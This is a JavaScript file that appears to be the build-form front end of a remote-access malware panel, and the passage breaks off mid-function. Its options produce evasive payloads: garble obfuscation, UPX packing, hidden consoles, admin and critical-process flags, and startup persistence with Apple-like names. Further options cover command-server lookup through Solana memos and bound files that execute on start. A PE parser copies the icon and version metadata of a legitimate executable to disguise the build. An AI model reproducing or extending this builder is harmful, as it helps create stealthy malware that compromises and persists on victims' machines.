const form = document.getElementById("build-form");
const buildBtn = document.getElementById("build-btn");
const buildStatus = document.getElementById("build-status");
const buildStatusText = document.getElementById("build-status-text");
const buildOutputDiv = document.getElementById("build-output");
const buildOutputContainer = document.getElementById("build-output-container");
const buildResults = document.getElementById("build-results");
const buildFilesDiv = document.getElementById("build-files");
const logoutBtn = document.getElementById("logout-btn");
const usernameDisplay = document.getElementById("username-display");
const roleBadge = document.getElementById("role-badge");
const usersLink = document.getElementById("users-link");
const buildLink = document.getElementById("build-link");
const scriptsLink = document.getElementById("scripts-link");
const pluginsLink = document.getElementById("plugins-link");
const rawServerListCheckbox = document.getElementById("raw-server-list");
const serverUrlInput = document.getElementById("server-url");
const solMemoCheckbox = document.getElementById("sol-memo");
const solSettings = document.getElementById("sol-settings");

let currentServerVersion = null;
let currentUserRole = null;

async function loadServerVersion() {
  try {
    const res = await fetch("/api/version", { credentials: "include" });
    if (!res.ok) {
      currentServerVersion = null;
      return;
    }
    const payload = await res.json();
    const version = typeof payload?.version === "string" ? payload.version.trim() : "";
    currentServerVersion = version || null;
  } catch {
    currentServerVersion = null;
  }
}

function getDefaultServerUrlPlaceholder(isRawList) {
  const isHttps = window.location.protocol === "https:";
  const host = window.location.host;
  if (isRawList) {
    return `${isHttps ? "https" : "http"}://${host}/list.txt`;
  }
  return host;
}

function updateServerUrlPlaceholder() {
  if (!serverUrlInput) return;
  const isRaw = rawServerListCheckbox?.checked ?? false;
  const placeholder = getDefaultServerUrlPlaceholder(isRaw);
  serverUrlInput.placeholder = placeholder;
  if (!serverUrlInput.value.trim()) {
    serverUrlInput.value = placeholder;
  }
}

let isBuilding = false;

function initAccordions() {
  document.querySelectorAll(".accordion-section").forEach((section) => {
    const header = section.querySelector(".accordion-header");
    const body = section.querySelector(".accordion-body");
    const chevron = section.querySelector(".accordion-chevron");
    const startOpen = section.dataset.open !== "false";

    if (!startOpen) {
      body.classList.add("collapsed");
    } else {
      chevron.classList.add("rotated");
    }

    header.addEventListener("click", () => {
      const nowCollapsed = body.classList.toggle("collapsed");
      chevron.classList.toggle("rotated", !nowCollapsed);
    });
  });
}

function updateWindowsSectionVisibility() {
  const windowsSection = document.getElementById("windows-settings-section");
  if (!windowsSection) return;
  const hasWindows = Array.from(
    document.querySelectorAll('input[name="platform"]:checked'),
  ).some((el) => el.value.startsWith("windows-"));
  windowsSection.classList.toggle("hidden", !hasWindows);
}

const BUILD_SETTINGS_KEY = "overlord_build_settings";

function saveFormSettings() {
  try {
    const settings = {
      platforms: Array.from(document.querySelectorAll('input[name="platform"]')).map((el) => ({ value: el.value, checked: el.checked })),
      serverUrl: document.getElementById("server-url")?.value ?? "",
      rawServerList: document.getElementById("raw-server-list")?.checked ?? false,
      solMemo: document.getElementById("sol-memo")?.checked ?? false,
      solAddress: document.getElementById("sol-address")?.value ?? "",
      solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value ?? "",
      mutex: document.getElementById("mutex")?.value ?? "",
      disableMutex: document.querySelector('input[name="disable-mutex"]')?.checked ?? false,
      stripDebug: document.querySelector('input[name="strip-debug"]')?.checked ?? true,
      disableCgo: document.querySelector('input[name="disable-cgo"]')?.checked ?? false,
      noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
      obfuscate: document.querySelector('input[name="obfuscate"]')?.checked ?? false,
      garbleLiterals: document.querySelector('input[name="garble-literals"]')?.checked ?? false,
      garbleTiny: document.querySelector('input[name="garble-tiny"]')?.checked ?? false,
      garbleSeed: document.getElementById("garble-seed")?.value ?? "",
      enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
      upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
      sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
      enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
      persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
      startupName: document.getElementById("startup-name")?.value ?? "",
      hideConsole: document.querySelector('input[name="hide-console"]')?.checked ?? false,
      requireAdmin: document.querySelector('input[name="require-admin"]')?.checked ?? false,
      criticalProcess: document.querySelector('input[name="critical-process"]')?.checked ?? false,
      assemblyTitle: document.getElementById("assembly-title")?.value ?? "",
      assemblyProduct: document.getElementById("assembly-product")?.value ?? "",
      assemblyCompany: document.getElementById("assembly-company")?.value ?? "",
      assemblyVersion: document.getElementById("assembly-version")?.value ?? "",
      assemblyCopyright: document.getElementById("assembly-copyright")?.value ?? "",
      outputExtension: document.getElementById("output-extension")?.value ?? ".exe",
      cryptableMode: document.getElementById("cryptable-mode")?.checked ?? false,
    };
    localStorage.setItem(BUILD_SETTINGS_KEY, JSON.stringify(settings));
  } catch (err) {
    console.error("Failed to save form settings:", err);
  }
}

function restoreFormSettings() {
  try {
    const raw = localStorage.getItem(BUILD_SETTINGS_KEY);
    if (!raw) return;
    const s = JSON.parse(raw);

    const setVal = (id, val) => { const el = document.getElementById(id); if (el && val !== undefined) el.value = val; };
    const setCb = (sel, val) => { const el = document.querySelector(sel); if (el && val !== undefined) el.checked = val; };

    if (Array.isArray(s.platforms)) {
      s.platforms.forEach(({ value, checked }) => {
        const el = document.querySelector(`input[name="platform"][value="${value}"]`);
        if (el) el.checked = checked;
      });
    }
    if (s.serverUrl !== undefined) setVal("server-url", s.serverUrl);
    if (s.rawServerList !== undefined) setCb("#raw-server-list", s.rawServerList);
    if (s.solMemo !== undefined) setCb("#sol-memo", s.solMemo);
    if (s.solAddress !== undefined) setVal("sol-address", s.solAddress);
    if (s.solRpcEndpoints !== undefined) setVal("sol-rpc-endpoints", s.solRpcEndpoints);
    if (s.mutex !== undefined) setVal("mutex", s.mutex);
    if (s.disableMutex !== undefined) setCb('input[name="disable-mutex"]', s.disableMutex);
    if (s.stripDebug !== undefined) setCb('input[name="strip-debug"]', s.stripDebug);
    if (s.disableCgo !== undefined) setCb('input[name="disable-cgo"]', s.disableCgo);
    if (s.noPrinting !== undefined) setCb('input[name="no-printing"]', s.noPrinting);
    if (s.obfuscate !== undefined) setCb('input[name="obfuscate"]', s.obfuscate);
    if (s.garbleLiterals !== undefined) setCb('input[name="garble-literals"]', s.garbleLiterals);
    if (s.garbleTiny !== undefined) setCb('input[name="garble-tiny"]', s.garbleTiny);
    if (s.garbleSeed !== undefined) setVal("garble-seed", s.garbleSeed);
    if (s.enableUpx !== undefined) setCb('input[name="enable-upx"]', s.enableUpx);
    if (s.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', s.upxStripHeaders);
    if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
    if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
    if (Array.isArray(s.persistenceMethods)) {
      document.querySelectorAll('input[name="persistence-method"]').forEach((el) => {
        el.checked = s.persistenceMethods.includes(el.value);
      });
    }
    if (s.startupName !== undefined) setVal("startup-name", s.startupName);
    if (s.hideConsole !== undefined) setCb('input[name="hide-console"]', s.hideConsole);
    if (s.requireAdmin !== undefined) setCb('input[name="require-admin"]', s.requireAdmin);
    if (s.criticalProcess !== undefined) setCb('input[name="critical-process"]', s.criticalProcess);
    if (s.assemblyTitle !== undefined) setVal("assembly-title", s.assemblyTitle);
    if (s.assemblyProduct !== undefined) setVal("assembly-product", s.assemblyProduct);
    if (s.assemblyCompany !== undefined) setVal("assembly-company", s.assemblyCompany);
    if (s.assemblyVersion !== undefined) setVal("assembly-version", s.assemblyVersion);
    if (s.assemblyCopyright !== undefined) setVal("assembly-copyright", s.assemblyCopyright);
    if (s.outputExtension !== undefined) setVal("output-extension", s.outputExtension);
    if (s.cryptableMode !== undefined) setCb("#cryptable-mode", s.cryptableMode);

    const restoredObfuscate = document.querySelector('input[name="obfuscate"]');
    const garbleContainer = document.getElementById("garble-settings-container");
    if (restoredObfuscate && garbleContainer) {
      garbleContainer.classList.toggle("hidden", !restoredObfuscate.checked);
    }
    const restoredUpx = document.querySelector('input[name="enable-upx"]');
    const upxContainer = document.getElementById("upx-settings-container");
    if (restoredUpx && upxContainer) {
      upxContainer.classList.toggle("hidden", !restoredUpx.checked);
    }
  } catch (err) {
    console.error("Failed to restore form settings:", err);
  }
}

const CRYPTABLE_DISABLE_TARGETS = [
  'input[name="enable-persistence"]',
  'input[name="enable-upx"]',
  'input[name="upx-strip-headers"]',
  'input[name="hide-console"]',
  'input[name="require-admin"]',
  'input[name="critical-process"]',
];

const CRYPTABLE_DISABLE_INPUTS = [
  "#assembly-title",
  "#assembly-product",
  "#assembly-company",
  "#assembly-version",
  "#assembly-copyright",
  "#output-extension",
  "#sleep-seconds",
];

const CRYPTABLE_HIDE_SECTIONS = [4, 5, 6];

function applyCryptableMode(enabled) {
  const badge = document.getElementById("cryptable-badge");
  if (badge) badge.classList.toggle("hidden", !enabled);

  CRYPTABLE_DISABLE_TARGETS.forEach((sel) => {
    const el = document.querySelector(sel);
    if (!el) return;
    if (enabled) {
      el.checked = false;
      el.disabled = true;
      el.closest("label")?.classList.add("opacity-40", "pointer-events-none");
    } else {
      el.disabled = false;
      el.closest("label")?.classList.remove("opacity-40", "pointer-events-none");
    }
  });

  CRYPTABLE_DISABLE_INPUTS.forEach((sel) => {
    const el = document.querySelector(sel);
    if (!el) return;
    if (enabled) {
      el.dataset.preCryptableValue = el.value;
      el.value = el.type === "number" ? "0" : "";
      el.disabled = true;
      el.classList.add("opacity-40");
    } else {
      if (el.dataset.preCryptableValue !== undefined) {
        el.value = el.dataset.preCryptableValue;
        delete el.dataset.preCryptableValue;
      }
      el.disabled = false;
      el.classList.remove("opacity-40");
    }
  });

  const iconUploadEl = document.getElementById("icon-upload");
  const iconLabelEl = document.getElementById("icon-label");
  if (iconUploadEl) iconUploadEl.disabled = enabled;
  if (iconLabelEl && enabled) iconLabelEl.closest("label")?.classList.toggle("opacity-40", enabled);
  if (iconLabelEl && !enabled) iconLabelEl.closest("label")?.classList.remove("opacity-40");

  const cloneExeUploadEl = document.getElementById("clone-exe-upload");
  if (cloneExeUploadEl) cloneExeUploadEl.disabled = enabled;
  if (cloneExeUploadEl) cloneExeUploadEl.closest("label")?.classList.toggle("opacity-40", enabled);

  const bindAddLabelEl = document.getElementById("bind-add-label");
  if (bindAddLabelEl) {
    bindAddLabelEl.classList.toggle("opacity-40", enabled);
    bindAddLabelEl.classList.toggle("pointer-events-none", enabled);
  }

  const sections = document.querySelectorAll(".accordion-section");
  CRYPTABLE_HIDE_SECTIONS.forEach((idx) => {
    const sec = sections[idx - 1];
    if (!sec) return;
    if (enabled) {
      sec.classList.add("opacity-30", "pointer-events-none");
      sec.dataset.cryptableDisabled = "true";
    } else {
      sec.classList.remove("opacity-30", "pointer-events-none");
      delete sec.dataset.cryptableDisabled;
    }
  });

  if (enabled) {
    updatePersistenceSettingsVisibility();
    const upxC = document.getElementById("upx-settings-container");
    if (upxC) upxC.classList.add("hidden");
  }

  saveFormSettings();
}

restoreFormSettings();
initAccordions();
updateWindowsSectionVisibility();
init();

if (solMemoCheckbox && solSettings) {
  solSettings.classList.toggle("hidden", !solMemoCheckbox.checked);
}

if (rawServerListCheckbox && serverUrlInput) {
  rawServerListCheckbox.addEventListener("change", () => {
    const isRaw = rawServerListCheckbox.checked;
    const current = serverUrlInput.value.trim();

    if (isRaw && solMemoCheckbox) {
      solMemoCheckbox.checked = false;
      if (solSettings) solSettings.classList.add("hidden");
    }

    if (isRaw) {
      if (current.startsWith("wss://")) {
        serverUrlInput.value = "https://" + current.slice("wss://".length);
      } else if (current.startsWith("ws://")) {
        serverUrlInput.value = "http://" + current.slice("ws://".length);
      }
      serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(true);
    } else {
      if (current.startsWith("https://")) {
        serverUrlInput.value = "wss://" + current.slice("https://".length);
      } else if (current.startsWith("http://")) {
        serverUrlInput.value = "ws://" + current.slice("http://".length);
      }
      serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(false);
    }
  });
}

if (solMemoCheckbox && solSettings) {
  solMemoCheckbox.addEventListener("change", () => {
    const isSol = solMemoCheckbox.checked;
    solSettings.classList.toggle("hidden", !isSol);

    if (isSol && rawServerListCheckbox) {
      rawServerListCheckbox.checked = false;
      if (serverUrlInput) {
        serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(false);
      }
    }

    if (isSol) {
      const rpcField = document.getElementById("sol-rpc-endpoints");
      if (rpcField && !rpcField.value.trim()) {
        rpcField.value = [
          "https://api.mainnet-beta.solana.com",
          "https://solana-mainnet.gateway.tatum.io",
          "https://go.getblock.us/86aac42ad4484f3c813079afc201451c",
          "https://solana-rpc.publicnode.com",
          "https://api.blockeden.xyz/solana/KeCh6p22EX5AeRHxMSmc",
          "https://solana.drpc.org",
          "https://solana.leorpc.com/?api_key=FREE",
          "https://solana.api.onfinality.io/public",
          "https://solana.api.pocket.network/",
        ].join("\n");
      }
    }
  });
}

const persistenceCheckbox = document.querySelector('input[name="enable-persistence"]');
const persistenceMethodContainer = document.getElementById("persistence-method-container");
const persistenceEmptyState = document.getElementById("persistence-empty-state");
const persistenceWindowsSettings = document.getElementById("persistence-windows-settings");
const persistenceLinuxSettings = document.getElementById("persistence-linux-settings");
const persistenceMacSettings = document.getElementById("persistence-macos-settings");
const persistenceStartupNameContainer = document.getElementById("persistence-startup-name-container");
const startupNameMacosHint = document.getElementById("startup-name-macos-hint");
const startupNameDefaultHint = document.getElementById("startup-name-default-hint");
const startupNameError = document.getElementById("startup-name-error");
const platformInputs = document.querySelectorAll('input[name="platform"]');

function getSelectedPlatformFamilies() {
  const selectedPlatforms = Array.from(
    document.querySelectorAll('input[name="platform"]:checked'),
  ).map((el) => el.value);

  return {
    windows: selectedPlatforms.some((platform) => platform.startsWith("windows-")),
    linux: selectedPlatforms.some((platform) => platform.startsWith("linux-")),
    darwin: selectedPlatforms.some((platform) => platform.startsWith("darwin-")),
  };
}

function validateStartupName() {
  if (!startupNameError) return true;
  const families = getSelectedPlatformFamilies();
  const val = document.getElementById("startup-name")?.value.trim() || "";
  if (families.darwin && val && !val.startsWith("com.")) {
    startupNameError.textContent = "macOS requires the name to start with \"com.\" (e.g. com.apple.updater)";
    startupNameError.classList.remove("hidden");
    return false;
  }
  startupNameError.textContent = "";
  startupNameError.classList.add("hidden");
  return true;
}

function updatePersistenceSettingsVisibility() {
  if (!persistenceMethodContainer) return;

  const persistenceEnabled = !!persistenceCheckbox?.checked;
  if (!persistenceEnabled) {
    persistenceMethodContainer.classList.add("hidden");
    return;
  }

  persistenceMethodContainer.classList.remove("hidden");

  const families = getSelectedPlatformFamilies();
  const hasSupportedFamily = families.windows || families.linux || families.darwin;

  if (persistenceWindowsSettings) {
    persistenceWindowsSettings.classList.toggle("hidden", !families.windows);
  }
  if (persistenceLinuxSettings) {
    persistenceLinuxSettings.classList.toggle("hidden", !families.linux);
  }
  if (persistenceMacSettings) {
    persistenceMacSettings.classList.toggle("hidden", !families.darwin);
  }
  if (persistenceStartupNameContainer) {
    persistenceStartupNameContainer.classList.toggle("hidden", !hasSupportedFamily);
  }
  if (startupNameMacosHint) {
    startupNameMacosHint.classList.toggle("hidden", !families.darwin);
  }
  if (startupNameDefaultHint) {
    startupNameDefaultHint.classList.toggle("hidden", families.darwin);
  }
  if (persistenceEmptyState) {
    persistenceEmptyState.classList.toggle("hidden", hasSupportedFamily);
  }
  validateStartupName();
}

if (persistenceCheckbox && persistenceMethodContainer) {
  persistenceCheckbox.addEventListener("change", updatePersistenceSettingsVisibility);
}

platformInputs.forEach((input) => {
  input.addEventListener("change", updatePersistenceSettingsVisibility);
  input.addEventListener("change", updateWindowsSectionVisibility);
});

document.getElementById("startup-name")?.addEventListener("input", validateStartupName);

updatePersistenceSettingsVisibility();

form?.addEventListener("change", saveFormSettings);
form?.addEventListener("input", saveFormSettings);

const obfuscateCheckbox = document.querySelector('input[name="obfuscate"]');
const garbleSettingsContainer = document.getElementById("garble-settings-container");
if (obfuscateCheckbox && garbleSettingsContainer) {
  obfuscateCheckbox.addEventListener("change", () => {
    if (obfuscateCheckbox.checked) {
      garbleSettingsContainer.classList.remove("hidden");
    } else {
      garbleSettingsContainer.classList.add("hidden");
    }
  });
}

const upxCheckbox = document.querySelector('input[name="enable-upx"]');
const upxSettingsContainer = document.getElementById("upx-settings-container");
if (upxCheckbox && upxSettingsContainer) {
  upxCheckbox.addEventListener("change", () => {
    if (upxCheckbox.checked) {
      upxSettingsContainer.classList.remove("hidden");
    } else {
      upxSettingsContainer.classList.add("hidden");
    }
  });
}

const cryptableCheckbox = document.getElementById("cryptable-mode");
if (cryptableCheckbox) {
  cryptableCheckbox.addEventListener("change", () => {
    applyCryptableMode(cryptableCheckbox.checked);
  });
  if (cryptableCheckbox.checked) {
    applyCryptableMode(true);
  }
}

let pendingIconBase64 = null;
const iconUpload = document.getElementById("icon-upload");
const iconLabel = document.getElementById("icon-label");
const iconClear = document.getElementById("icon-clear");

if (iconUpload) {
  iconUpload.addEventListener("change", () => {
    const file = iconUpload.files[0];
    if (!file) return;
    if (file.size > 1024 * 1024) {
      alert("Icon file must be under 1MB");
      iconUpload.value = "";
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result.split(",")[1];
      pendingIconBase64 = base64;
      if (iconLabel) iconLabel.textContent = file.name;
      if (iconClear) iconClear.classList.remove("hidden");
    };
    reader.readAsDataURL(file);
  });
}

if (iconClear) {
  iconClear.addEventListener("click", () => {
    pendingIconBase64 = null;
    if (iconUpload) iconUpload.value = "";
    if (iconLabel) iconLabel.textContent = "Choose .ico file";
    iconClear.classList.add("hidden");
  });
}

function extractPEMetadata(buffer) {
  const dv    = new DataView(buffer);
  const bytes = new Uint8Array(buffer);

  const u8  = (o) => dv.getUint8(o);
  const u16 = (o) => dv.getUint16(o, true);
  const u32 = (o) => dv.getUint32(o, true);
  const alignUp = (n) => (n + 3) & ~3;

  if (buffer.byteLength < 0x40) throw new Error("File too small");
  if (u16(0) !== 0x5A4D) throw new Error("Not a PE file (missing MZ header)");

  const peOff = u32(0x3C);
  if (peOff + 24 > buffer.byteLength) throw new Error("Invalid PE offset");
  if (u32(peOff) !== 0x4550) throw new Error("Not a PE file (missing PE signature)");

  const numSections  = u16(peOff + 6);
  const optHdrSize   = u16(peOff + 20);
  const optMagic     = u16(peOff + 24);
  const is64         = optMagic === 0x20B; // PE32+ vs PE32

  const dataDirsOff = peOff + 24 + (is64 ? 112 : 96);
  const rsrcRVA     = u32(dataDirsOff + 2 * 8); // index 2 = IMAGE_DIRECTORY_ENTRY_RESOURCE
  if (rsrcRVA === 0) throw new Error("No resource section RVA");

  const secTableOff = peOff + 24 + optHdrSize;
  let rsrcRaw = 0;
  for (let i = 0; i < numSections; i++) {
    const s   = secTableOff + i * 40;
    const va  = u32(s + 12);
    const vsz = Math.max(u32(s + 8), u32(s + 16));
    const raw = u32(s + 20);
    if (rsrcRVA >= va && rsrcRVA < va + vsz) {
      rsrcRaw = raw + (rsrcRVA - va);
      break;
    }
  }
  if (!rsrcRaw) throw new Error("Could not locate resource section raw data");

  const rvaToOff = (rva) => rsrcRaw + (rva - rsrcRVA);

  function rsrcDir(dirOff) {
    if (dirOff + 16 > buffer.byteLength) return [];
    const numNamed = u16(dirOff + 12);
    const numId    = u16(dirOff + 14);
    const total    = numNamed + numId;
    const entries  = [];
    for (let i = 0; i < total; i++) {
      const e        = dirOff + 16 + i * 8;
      if (e + 8 > buffer.byteLength) break;
      const nameOrId  = u32(e);
      const dataOrDir = u32(e + 4);
      entries.push({
        id:       (nameOrId  & 0x80000000) ? null : nameOrId,
        isSubDir: (dataOrDir & 0x80000000) !== 0,
        off:       dataOrDir & 0x7FFFFFFF,
      });
    }
    return entries;
  }

  const WANT = new Set([3, 14, 16]);
  const resources = {};
  for (const te of rsrcDir(rsrcRaw)) {
    if (te.id === null || !WANT.has(te.id) || !te.isSubDir) continue;
    resources[te.id] = {};
    for (const ne of rsrcDir(rsrcRaw + te.off)) {
      if (!ne.isSubDir) continue;
      const nameId = ne.id ?? 1;
      resources[te.id][nameId] = [];
      for (const le of rsrcDir(rsrcRaw + ne.off)) {
        if (le.isSubDir) continue;
        const deOff = rsrcRaw + le.off;
        if (deOff + 8 > buffer.byteLength) continue;
        const dataRVA  = u32(deOff);
        const dataSize = u32(deOff + 4);
        const dataOff  = rvaToOff(dataRVA);
        if (dataOff + dataSize <= buffer.byteLength)
          resources[te.id][nameId].push({ dataOff, dataSize });
      }
    }
  }

  function parseVersionStrings(absOff, size) {
    const strings = {};
    const end = absOff + size;
    let pos = absOff;
    if (pos + 6 > end) return strings;

    const viLen    = u16(pos);
    const viValLen = u16(pos + 2);
    pos += 6;

    while (pos + 1 < end && (u8(pos) | u8(pos + 1))) pos += 2;
    pos = alignUp(pos + 2);
    pos += viValLen;
    pos = alignUp(pos);

    const viEnd = Math.min(absOff + viLen, end);
    while (pos + 6 < viEnd) {
      const childLen = u16(pos);
      if (childLen < 6) break;
      const childEnd = Math.min(pos + childLen, viEnd);

      let kp = pos + 6;
      let key = "";
      while (kp + 1 < childEnd && (u8(kp) | u8(kp + 1))) {
        key += String.fromCharCode(u8(kp) | (u8(kp + 1) << 8));
        kp += 2;
      }
      kp = alignUp(kp + 2);

      if (key === "StringFileInfo") {
        let sp = kp;
        while (sp + 6 < childEnd) {
          const stLen = u16(sp);
          if (stLen < 6) break;
          const stEnd = Math.min(sp + stLen, childEnd);
          let tp = sp + 6;
          while (tp + 1 < stEnd && (u8(tp) | u8(tp + 1))) tp += 2;
          tp = alignUp(tp + 2);

          while (tp + 6 < stEnd) {
            const sLen    = u16(tp);
            if (sLen < 6) break;
            const sEnd    = Math.min(tp + sLen, stEnd);
            const sValLen = u16(tp + 2);
            let np = tp + 6;
            let name = "";
            while (np + 1 < sEnd && (u8(np) | u8(np + 1))) {
              name += String.fromCharCode(u8(np) | (u8(np + 1) << 8));
              np += 2;
            }
            np = alignUp(np + 2);
            let val = "";
            const valEnd = Math.min(np + sValLen * 2, sEnd);
            while (np + 1 < valEnd && (u8(np) | u8(np + 1))) {
              val += String.fromCharCode(u8(np) | (u8(np + 1) << 8));
              np += 2;
            }
            if (name) strings[name] = val;
            tp = alignUp(sEnd);
          }
          sp = alignUp(stEnd);
        }
      }
      pos = alignUp(childEnd);
    }
    return strings;
  }

  function buildIco(groupOff, iconRes) {
    if (groupOff + 6 > buffer.byteLength) return null;
    const count = u16(groupOff + 4);
    if (count === 0 || groupOff + 6 + count * 14 > buffer.byteLength) return null;

    const grpEntries = [];
    for (let i = 0; i < count; i++) {
      const e = groupOff + 6 + i * 14;
      grpEntries.push({
        w: u8(e), h: u8(e + 1), cc: u8(e + 2),
        planes: u16(e + 4), bits: u16(e + 6),
        size: u32(e + 8), id: u16(e + 12),
      });
    }

    const iconData = [];
    for (const en of grpEntries) {
      const rd = iconRes[en.id];
      if (!rd || rd.length === 0) continue;
      iconData.push({ en, dataOff: rd[0].dataOff, dataSize: rd[0].dataSize });
    }
    if (iconData.length === 0) return null;

    let totalSize = 6 + iconData.length * 16;
    for (const id of iconData) totalSize += id.dataSize;

    const ico = new Uint8Array(totalSize);
    const idv = new DataView(ico.buffer);
    let p = 0;

    idv.setUint16(p, 0, true); p += 2; // reserved
    idv.setUint16(p, 1, true); p += 2; // type = ICO
    idv.setUint16(p, iconData.length, true); p += 2;

    let dataOffset = 6 + iconData.length * 16;
    const entryStart = p;
    let ep = entryStart;
    p += iconData.length * 16;

    for (const { en, dataOff, dataSize } of iconData) {
      ico[ep]   = en.w;
      ico[ep+1] = en.h;
      ico[ep+2] = en.cc;
      ico[ep+3] = 0;
      idv.setUint16(ep + 4,  en.planes,  true);
      idv.setUint16(ep + 6,  en.bits,    true);
      idv.setUint32(ep + 8,  dataSize,   true);
      idv.setUint32(ep + 12, dataOffset, true);
      ep += 16;

      ico.set(bytes.subarray(dataOff, dataOff + dataSize), dataOffset);
      dataOffset += dataSize;
    }

    let bin = "";
    for (let i = 0; i < ico.length; i++) bin += String.fromCharCode(ico[i]);
    return btoa(bin);
  }

  const result = {};

  if (resources[16]) {
    const vd = Object.values(resources[16]).flat()[0];
    if (vd) {
      try { result.strings = parseVersionStrings(vd.dataOff, vd.dataSize); } catch (_) {}
    }
  }

  if (resources[14] && resources[3]) {
    const gd = Object.values(resources[14]).flat()[0];
    if (gd) {
      try { result.iconBase64 = buildIco(gd.dataOff, resources[3]); } catch (_) {}
    }
  }

  return result;
}

const cloneExeUpload = document.getElementById("clone-exe-upload");
const cloneExeLabel  = document.getElementById("clone-exe-label");
const cloneExeStatus = document.getElementById("clone-exe-status");

function setCloneStatus(msg, isError) {
  if (!cloneExeStatus) return;
  cloneExeStatus.textContent = msg;
  cloneExeStatus.className   = "text-xs " + (isError ? "text-red-400" : "text-emerald-400");
  cloneExeStatus.classList.remove("hidden");
}

if (cloneExeUpload) {
  cloneExeUpload.addEventListener("change", () => {
    const file = cloneExeUpload.files[0];
    if (!file) return;

    if (cloneExeLabel) cloneExeLabel.textContent = file.name;
    setCloneStatus("Parsing...", false);

    const reader = new FileReader();
    reader.onload = () => {
      try {
        const meta = extractPEMetadata(reader.result);
        const s    = meta.strings || {};

        const fields = [
          ["assembly-title",     s["FileDescription"]  ?? s["InternalName"] ?? ""],
          ["assembly-product",   s["ProductName"]       ?? ""],
          ["assembly-company",   s["CompanyName"]       ?? ""],
          ["assembly-version",   s["FileVersion"]?.replace(/,\s*/g, ".") ?? s["ProductVersion"]?.replace(/,\s*/g, ".") ?? ""],
          ["assembly-copyright", s["LegalCopyright"]    ?? s["LegalTrademarks"] ?? ""],
        ];

        let filled = 0;
        for (const [id, val] of fields) {
          const el = document.getElementById(id);
          if (el && val) { el.value = val; filled++; }
        }

        if (meta.iconBase64) {
          const decodedBytes = Math.floor(meta.iconBase64.length * 3 / 4);
          if (decodedBytes <= 1024 * 1024) {
            pendingIconBase64 = meta.iconBase64;
            if (iconLabel) iconLabel.textContent = file.name + " (cloned icon)";
            if (iconClear)  iconClear.classList.remove("hidden");
            setCloneStatus(`Cloned ${filled} metadata field(s) + icon`, false);
          } else {
            setCloneStatus(`Cloned ${filled} metadata field(s) (icon too large, skipped)`, false);
          }
        } else {
          setCloneStatus(filled > 0 ? `Cloned ${filled} metadata field(s), no icon found` : "No metadata found in file", !filled);
        }
      } catch (err) {
        setCloneStatus("Error: " + err.message, true);
      }
      cloneExeUpload.value = "";
    };
    reader.readAsArrayBuffer(file);
  });
}

const MAX_BIND_FILES = 5;
const MAX_BIND_FILE_BYTES = 50 * 1024 * 1024; // 50 MB

let boundFiles = []; // { name, base64, targetOS: string[], execute: boolean }

const bindFileInput = document.getElementById("bind-file-input");
const bindFilesList = document.getElementById("bind-files-list");
const bindAddLabel = document.getElementById("bind-add-label");

function sanitizeBindName(name) {
  return name.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 64) || "file";
}

function renderBoundFiles() {
  if (!bindFilesList) return;
  bindFilesList.innerHTML = "";

  boundFiles.forEach((entry, idx) => {
    const div = document.createElement("div");
    div.className = "flex flex-col gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg";

    const osList = ["windows", "linux", "darwin"];
    const osIcons = { windows: "fa-brands fa-windows", linux: "fa-brands fa-linux", darwin: "fa-brands fa-apple" };
    const osColors = { windows: "text-blue-400", linux: "text-amber-400", darwin: "text-slate-200" };
    const osLabels = { windows: "Windows", linux: "Linux", darwin: "macOS" };

    const osCheckboxes = osList
      .map(
        (os) =>
          `<label class="flex items-center gap-1 text-xs cursor-pointer select-none">
            <input type="checkbox" class="bind-os-cb w-3 h-3" data-idx="${idx}" data-os="${os}"
              ${entry.targetOS.length === 0 || entry.targetOS.includes(os) ? "checked" : ""} />
            <i class="${osIcons[os]} ${osColors[os]}"></i> ${osLabels[os]}
          </label>`,
      )
      .join("");

    div.innerHTML = `
      <div class="flex items-center gap-2">
        <i class="fa-solid fa-file text-violet-400 shrink-0"></i>
        <span class="text-sm font-medium text-slate-200 truncate flex-1">${entry.name}</span>
        <button type="button" class="bind-remove-btn text-red-400 hover:text-red-300 text-xs px-1" data-idx="${idx}" title="Remove">
          <i class="fa-solid fa-xmark"></i>
        </button>
      </div>
      <div class="flex items-center gap-3 flex-wrap">
        <span class="text-xs text-slate-500 shrink-0">Run on:</span>
        ${osCheckboxes}
        <span class="flex-1"></span>
        <label class="flex items-center gap-1 text-xs cursor-pointer select-none">
          <input type="checkbox" class="bind-exec-cb w-3 h-3" data-idx="${idx}" ${entry.execute ? "checked" : ""} />
          <i class="fa-solid fa-play text-green-400"></i> Execute on start
        </label>
      </div>
    `;

    div.querySelector(".bind-remove-btn").addEventListener("click", () => {
      boundFiles.splice(idx, 1);
      renderBoundFiles();
      updateBindAddVisibility();
    });

    div.querySelectorAll(".bind-os-cb").forEach((cb) => {
      cb.addEventListener("change", () => {
        const checked = Array.from(div.querySelectorAll(`.bind-os-cb[data-idx="${idx}"]`))
          .filter((el) => el.checked)
          .map((el) => el.dataset.os);
        boundFiles[idx].targetOS = checked.length === osList.length ? [] : checked;
      });
    });

    div.querySelector(".bind-exec-cb").addEventListener("change", (e) => {
      boundFiles[idx].execute = e.target.checked;
    });

    bindFilesList.appendChild(div);
  });
}

function updateBindAddVisibility() {
  if (!bindAddLabel) return;
  bindAddLabel.classList.toggle("hidden", boundFiles.length >= MAX_BIND_FILES);
}

if (bindFileInput) {
  bindFileInput.addEventListener("change", () => {
    const file = bindFileInput.files[0];
    bindFileInput.value = "";
    if (!file) return;

    if (boundFiles.length >= MAX_BIND_FILES) {
      alert(`Maximum ${MAX_BIND_FILES} files can be bound.`);
      return;
    }
    if (file.size > MAX_BIND_FILE_BYTES) {
